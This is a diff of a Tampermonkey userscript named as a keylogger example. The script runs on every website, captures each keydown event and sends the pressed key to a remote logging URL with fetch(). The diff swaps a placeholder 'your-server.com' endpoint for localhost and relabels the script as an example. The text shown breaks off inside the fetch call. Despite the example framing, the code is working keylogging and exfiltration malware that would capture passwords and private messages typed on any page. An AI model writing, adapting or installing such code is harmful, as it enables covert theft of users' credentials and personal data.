@@ -2,14 +2,16 @@
 // @name         Keylogger Example with Remote Logging
 // @namespace    http://tampermonkey.net/
 // @version      0.1
-// @description  Logs key presses and sends them to a remote server
+// @description  Example of logging keystrokes and sending them to a remote server
 // @author       FLGZX
 // @match        *://*/*
 // @grant        none
 // ==/UserScript==
+
 (function() {
     'use strict';
-    const REMOTE_SERVER_URL = 'https://your-server.com/log_key';
+    const REMOTE_SERVER_URL = 'http://localhost:3000/log_key'; // Replace with actual server URL
+
     document.addEventListener('keydown', function(event) {
         const keyPressed = event.key;
         fetch(REMOTE_SERVER_URL, {
